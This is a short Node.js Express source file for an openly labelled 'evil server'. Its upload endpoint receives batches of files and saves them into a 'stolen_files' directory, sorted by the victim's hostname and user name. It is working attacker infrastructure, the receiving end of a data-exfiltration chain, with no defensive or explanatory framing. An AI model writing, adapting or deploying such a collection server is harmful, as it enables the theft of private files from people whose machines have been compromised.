const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const dotenv = require('dotenv');
const morgan = require('morgan');
dotenv.config();
const app = express();
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        const hostname = req.body.hostname || 'unknown';
        const user = req.body.user || 'unknown';
        const folderPath = path.join(__dirname, 'stolen_files', hostname, user);
        if (!fs.existsSync(folderPath)) {
            fs.mkdirSync(folderPath, { recursive: true });
        }
        cb(null, folderPath);
    },
    filename: function (req, file, cb) {
        const timestamp = Date.now();
        cb(null, `${timestamp}_${file.originalname}`);
    }
});
const upload = multer({ storage: storage });
app.use(morgan('dev'));
app.use(express.json());
app.post('/upload', upload.array('files', 100), (req, res) => {
    console.log(`[+] Received files from ${req.body.hostname} (${req.body.user})`);
    if (req.files && req.files.length > 0) {
        req.files.forEach(file => {
            console.log(`[+] File saved: ${file.path}`);
        });
    }
    res.status(200).send('Files received successfully');
});
app.listen(process.env.PORT, "0.0.0.0", () => {
    console.log(`[+] Evil server listening on port ${process.env.PORT}`);
});